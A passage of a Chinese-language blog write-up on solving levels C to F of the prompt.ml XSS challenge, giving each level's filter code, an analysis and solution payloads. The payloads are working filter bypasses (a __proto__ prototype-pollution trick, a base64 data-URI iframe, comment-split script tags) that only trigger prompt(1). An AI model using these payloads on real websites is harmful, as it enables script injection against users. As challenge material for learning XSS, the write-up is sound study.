+<h2 id="Img-12"><a href="#Img-12" class="headerlink" title="Img:"></a>Img:</h2><ol>
+<li><code>eval((1558153217).toString(36).concat(String.fromCharCode(40)).concat(1).concat(String.fromCharCode(41)))</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/levelC_001.png" alt="C_1"></p>
+<ol start="2">
+<li><code>eval((630038579).toString(30))(1)</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/levelC_002.png" alt="C_2"></p>
+<h1 id="Level-D"><a href="#Level-D" class="headerlink" title="Level D"></a>Level D</h1><h2 id="Code-13"><a href="#Code-13" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// extend method from Underscore library</span></span><br><span class="line">    <span class="comment">// _.extend(destination, *sources) </span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">obj</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> source, prop;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">1</span>, length = <span class="built_in">arguments</span>.length; i &lt; length; i++) &#123;</span><br><span class="line">            source = <span class="built_in">arguments</span>[i];</span><br><span class="line">            <span class="keyword">for</span> (prop <span class="keyword">in</span> source) &#123;</span><br><span class="line">                obj[prop] = source[prop];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// a simple picture plugin</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in something like &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(input);</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: <span class="string">'http://placehold.it/350x150'</span></span><br><span class="line">        &#125;, <span class="built_in">JSON</span>.parse(input));</span><br><span class="line">        <span class="comment">// forbit invalid image source</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="regexp">/[^\w:\/.]/</span>.test(config.source)) &#123;</span><br><span class="line">            <span class="keyword">delete</span> config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// purify the source by stripping off "</span></span><br><span class="line">        <span class="keyword">var</span> source = config.source.replace(<span class="regexp">/"/g</span>, <span class="string">''</span>);</span><br><span class="line">        <span class="comment">// insert the content using mustache-ish template</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;img src="&#123;&#123;source&#125;&#125;"&gt;'</span>.replace(<span class="string">'&#123;&#123;source&#125;&#125;'</span>, source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid image data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;        <span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// in Soviet Russia...</span></span><br><span class="line">    input = <span class="built_in">encodeURIComponent</span>(input).replace(<span class="regexp">/'/g</span>, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// table flips you!</span></span><br><span class="line">    input = input.replace(<span class="regexp">/prompt/g</span>, <span class="string">'alert'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ノ┬─┬ノ ︵ ( \o°o)\</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;script&gt;'</span> + input + <span class="string">'&lt;/script&gt; '</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-13"><a href="#分析-13" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//input参数是这里进入的</span></span><br><span class="line">try &#123;</span><br><span class="line">        <span class="comment">// 举例输入的参数 &#123;"source":"http://sandbox.prompt.ml/PROMPT.JPG"&#125;</span></span><br><span class="line">        <span class="comment">//将input字符串转换成js数据</span></span><br><span class="line">        <span class="keyword">var</span> data = JSON.<span class="keyword">parse</span>(<span class="keyword">input</span>);</span><br><span class="line">        获得定死的source</span><br><span class="line">        <span class="keyword">var</span> config = extend(&#123;</span><br><span class="line">            <span class="comment">// default image source</span></span><br><span class="line">            source: 'http:<span class="comment">//placehold.it/350x150'</span></span><br><span class="line">        &#125;, JSON.<span class="keyword">parse</span>(<span class="keyword">input</span>));</span><br><span class="line">        <span class="comment">// 如果存在 字母数字下划线 / . 以外的就删除sourse </span></span><br><span class="line">        <span class="keyword">if</span> (/[^\w:\/.]/.<span class="keyword">test</span>(config.source)) &#123;</span><br><span class="line">            delete config.source;</span><br><span class="line">        &#125;</span><br><span class="line">        消除 "</span><br><span class="line">        <span class="keyword">var</span> source = config.source.<span class="keyword">replace</span>(/"/<span class="keyword">g</span>, '');</span><br><span class="line">        <span class="comment">// 插入sourse</span></span><br><span class="line">        <span class="keyword">return</span> '&lt;img src=<span class="string">"&#123;&#123;source&#125;&#125;"</span>&gt;'.<span class="keyword">replace</span>('&#123;&#123;source&#125;&#125;', source);</span><br><span class="line">    &#125; catch (<span class="keyword">e</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> 'Invalid image data.';</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这题的绕过需要<code>Object.prototype.__proto__</code>这个属性，这个属性已经不被建议用在实际代码中。</p>
+<p>看下面的例子是如何利用的。</p>
+<p><img src="/img/xss/prompt_ml/levelD_001.png" alt="D_1"></p>
+<p>当原来的值被删除时,可以用<code>__proto__</code>属性来赋值。可以构造形如</p>
+<p><code>{&quot;source&quot;:&quot;*&quot;,&quot;__proto__&quot;:{&quot;source&quot;:&quot;&quot;onerror=prompt(1)&gt;&quot;}}</code>来使原来的sources失效,而使用自己写入的来突破。</p>
+<p>但是第二次过滤的时候消除了<code>”</code>，想办法找个替代双引号的方法。</p>
+<p>这里的技巧为<code>String.prototype.replace()</code>支持特殊的<code>pattern</code>:</p>
+<p><img src="/img/xss/prompt_ml/levelD_002.png" alt="D_2"></p>
+<p>replace中使用$`会将变量的前部插入。</p>
+<p>在这里就是<code>&lt;img src=&quot;</code>，借用这个虽然playad结构改变,但是绕过了<code>&quot;</code></p>
+<h2 id="Solutions-13"><a href="#Solutions-13" class="headerlink" title="Solutions:"></a>Solutions:</h2><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>&#123;<span class="attr">"source"</span>:<span class="string">"*"</span>,<span class="attr">"__proto__"</span>:&#123;<span class="attr">"source"</span>:<span class="string">"$`onerror=prompt(1)&gt;"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Img-13"><a href="#Img-13" class="headerlink" title="Img:"></a>Img:</h2><p>1.</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"source"</span>:<span class="string">"*"</span>,<span class="attr">"__proto__"</span>:&#123;<span class="attr">"source"</span>:<span class="string">"$`onerror=prompt(1)&gt;"</span>&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/prompt_ml/levelD_003.png" alt="D_3"></p>
+<h1 id="Level-E"><a href="#Level-E" class="headerlink" title="Level E"></a>Level E</h1><h2 id="Code-14"><a href="#Code-14" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span></span> &#123;</span><br><span class="line">    // I expect this one will have other solutions, so be creative :)</span><br><span class="line">    // mspaint makes all file names <span class="keyword">in</span> all-caps :(</span><br><span class="line">    // too lazy to convert them back <span class="keyword">in</span> <span class="built_in">lower</span> case</span><br><span class="line">    // sample <span class="built_in">input</span>: prompt.jpg =&gt; PROMPT.JPG</span><br><span class="line">    <span class="built_in">input</span> = <span class="built_in">input</span>.toUpperCase();</span><br><span class="line">    // only allows images <span class="built_in">loaded</span> from own host <span class="keyword">or</span> data URI scheme</span><br><span class="line">    <span class="built_in">input</span> = <span class="built_in">input</span>.replace(/\/\/|\w+:/g, <span class="string">'data:'</span>);</span><br><span class="line">    // miscellaneous filtering</span><br><span class="line">    <span class="built_in">input</span> = <span class="built_in">input</span>.replace(/[\\&amp;+%\s]|vbs/gi, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;img src="'</span> + <span class="built_in">input</span> + <span class="string">'"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-14"><a href="#分析-14" class="headerlink" title="分析:"></a>分析:</h2><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">第一层：转成大写</span><br><span class="line">第二层：把// xxx:转成<span class="class"><span class="keyword">data</span>(<span class="title">xxx</span>表示任意字母)</span></span><br><span class="line">第三层：过滤了\ &amp; + % 空白符 和vbs</span><br><span class="line">由于转换了大写,html的标签无法使用了,这时候考虑引用外部的js文件。</span><br><span class="line">由于引用外部的js文件势必要使用到http:或http:这样的协议,所有这条路被封死了。</span><br><span class="line">考虑一下<span class="class"><span class="keyword">data</span>:是否能利用。</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/xss/prompt_ml/levelE_001.png" alt="E_1"></p>
+<p>因为经过大写转换,就只能利用base64编码的写法了。</p>
+<p><code>&lt;IFRAME/SRC=&quot;data:TEXT/HTML;BASE64,PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=&quot;&gt;</code></p>
+<p><code>PHNJCMLWDD5WCM9TCHQOMSK8L3NJCMLWDD4=</code>是<code>&lt;script&gt;prompt(1)&lt;/script&gt;</code>经过base64编码再改大写的。</p>
+<h2 id="Solutions-14"><a href="#Solutions-14" class="headerlink" title="Solutions:"></a>Solutions:</h2><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> <span class="string">"&gt;&lt;iframe/src="</span>data:text/html;base<span class="number">64</span>,PH<span class="symbol">NjcmlwdD5</span>wc<span class="name">m9</span>tcHQoMSk<span class="number">8</span>L<span class="number">3</span><span class="symbol">NjcmlwdD4</span>=</span><br></pre></td></tr></table></figure>
+
+<h2 id="Img-14"><a href="#Img-14" class="headerlink" title="Img:"></a>Img:</h2><p>这题在环境下没有成功,但是在本地测试下是可行的。</p>
+<p><img src="/img/xss/prompt_ml/levelE_002.png" alt="E_2"></p>
+<h1 id="Level-F"><a href="#Level-F" class="headerlink" title="Level F"></a>Level F</h1><h2 id="Code-15"><a href="#Code-15" class="headerlink" title="Code:"></a>Code:</h2><figure class="highlight scilab"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span><span class="params">(input)</span> &#123;</span></span><br><span class="line">    <span class="comment">// sort of spoiler of level 7</span></span><br><span class="line">    input = input.replace(/\*/g, <span class="string">''</span>);</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    var segments = input.split(<span class="string">'#'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span><span class="params">(title, index)</span> &#123;</span></span><br><span class="line">        <span class="comment">// title can only contain 15 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="</span>comment<span class="string">" title="</span><span class="string">' + title.slice(0, 15) + '</span><span class="string">" data-comment=\'&#123;"</span>id<span class="string">":'</span> + index + <span class="string">'&#125;\'&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="分析-15"><a href="#分析-15" class="headerlink" title="分析:"></a>分析:</h2><p>这一课和Level7的很类似。解决的思路是一样的,这里最大长度为15个字符,可以使用&lt;!–多行注释。</p>
+<h2 id="Solutions-15"><a href="#Solutions-15" class="headerlink" title="Solutions:"></a>Solutions:</h2><ol>
+<li><p><code>&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/script&gt;</code><br>经过测试firfox下面也可以<br><code>&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/</code></p>
+</li>
+<li></li>
+</ol>
+<p><code>&quot;&gt;&lt;script&gt;`#${prompt(1)}#`&lt;/script&gt;</code></p>
+<ol start="3">
+<li>利用eval函数特性执行拼接内容</li>
+</ol>
+<p><code>&quot;&gt;&lt;script&gt;/*#*/a=&#39;prom&#39;/*#*/+&#39;pt(1)&#39;/*#*/eval(a)/*#*/&lt;/script&gt;</code></p>
+<h2 id="Img-15"><a href="#Img-15" class="headerlink" title="Img:"></a>Img:</h2><ol>
+<li><code>&quot;&gt;&lt;svg&gt;&lt;!--#--&gt;&lt;script&gt;&lt;!--#--&gt;prompt(1&lt;!--#--&gt;)&lt;/</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/levelF_001.png" alt="F_1"></p>
+<ol start="2">
+<li><code>&quot;&gt;&lt;script&gt;`#${prompt(1)}#`&lt;/script&gt;</code></li>
+</ol>
+<p><img src="/img/xss/prompt_ml/levelF_002.png" alt="F_2"></p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+<div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-heart"></i>感谢阅读-------------</div>
+    
+</div>
+  
+</div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/XSS/" rel="tag"># XSS</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/10/14/sqli-labs-lession-29-GET基于错误-阻抗不匹配-有WAF的web应用/" rel="prev" title="sqli-labs lession-29 GET基于错误-阻抗不匹配-有WAF的web应用">
+                <i class="fa fa-chevron-left"></i> sqli-labs lession-29 GET基于错误-阻抗不匹配-有WAF的web应用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2018/10/10/DVWA-XSS‘DOM型’手记/" rel="next" title="DVWA-XSS‘DOM型’手记">
+                DVWA-XSS‘DOM型’手记 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+      <div id="sidebar-dimmer"></div>
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <a href="/">
+                <img class="site-author-image" itemprop="image" src="/images/jack.jpg" alt="嘤嘤怪er">
+              </a>
+            
+              <p class="site-author-name" itemprop="name">嘤嘤怪er</p>
+              <p class="site-description motion-element" itemprop="description">0menc</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">101</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  <a href="/categories/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-name">categories</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#prompt-xss笔记"><span class="nav-number">1.</span> <span class="nav-text">prompt-xss笔记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-0"><span class="nav-number">2.</span> <span class="nav-text">Level 0</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code"><span class="nav-number">2.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析"><span class="nav-number">2.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions"><span class="nav-number">2.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img"><span class="nav-number">2.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-1"><span class="nav-number">3.</span> <span class="nav-text">Level 1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-1"><span class="nav-number">3.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-1"><span class="nav-number">3.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-1"><span class="nav-number">3.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-1"><span class="nav-number">3.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-2"><span class="nav-number">4.</span> <span class="nav-text">Level 2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-2"><span class="nav-number">4.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-2"><span class="nav-number">4.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-2"><span class="nav-number">4.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-2"><span class="nav-number">4.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-3"><span class="nav-number">5.</span> <span class="nav-text">Level 3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-3"><span class="nav-number">5.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-3"><span class="nav-number">5.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-3"><span class="nav-number">5.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-3"><span class="nav-number">5.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-4"><span class="nav-number">6.</span> <span class="nav-text">Level 4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-4"><span class="nav-number">6.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-4"><span class="nav-number">6.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-4"><span class="nav-number">6.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-4"><span class="nav-number">6.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-5"><span class="nav-number">7.</span> <span class="nav-text">Level 5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-5"><span class="nav-number">7.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-5"><span class="nav-number">7.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-5"><span class="nav-number">7.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-5"><span class="nav-number">7.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-6"><span class="nav-number">8.</span> <span class="nav-text">Level 6</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-6"><span class="nav-number">8.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-6"><span class="nav-number">8.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-6"><span class="nav-number">8.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-6"><span class="nav-number">8.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-7"><span class="nav-number">9.</span> <span class="nav-text">Level 7</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-7"><span class="nav-number">9.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-7"><span class="nav-number">9.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-7"><span class="nav-number">9.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-7"><span class="nav-number">9.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-8"><span class="nav-number">10.</span> <span class="nav-text">Level 8</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-8"><span class="nav-number">10.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-8"><span class="nav-number">10.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-8"><span class="nav-number">10.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-8"><span class="nav-number">10.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-9"><span class="nav-number">11.</span> <span class="nav-text">Level 9</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-9"><span class="nav-number">11.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-9"><span class="nav-number">11.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-9"><span class="nav-number">11.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-9"><span class="nav-number">11.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-A"><span class="nav-number">12.</span> <span class="nav-text">Level A</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-10"><span class="nav-number">12.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-10"><span class="nav-number">12.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-10"><span class="nav-number">12.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-10"><span class="nav-number">12.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-B"><span class="nav-number">13.</span> <span class="nav-text">Level B</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-11"><span class="nav-number">13.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-11"><span class="nav-number">13.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-11"><span class="nav-number">13.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-11"><span class="nav-number">13.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-C"><span class="nav-number">14.</span> <span class="nav-text">Level C</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-12"><span class="nav-number">14.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-12"><span class="nav-number">14.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-12"><span class="nav-number">14.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-12"><span class="nav-number">14.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-D"><span class="nav-number">15.</span> <span class="nav-text">Level D</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Code-13"><span class="nav-number">15.1.</span> <span class="nav-text">Code:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#分析-13"><span class="nav-number">15.2.</span> <span class="nav-text">分析:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Solutions-13"><span class="nav-number">15.3.</span> <span class="nav-text">Solutions:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Img-13"><span class="nav-number">15.4.</span> <span class="nav-text">Img:</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Level-E"><span class="nav-number">16.</span> <span class="nav-text">Level 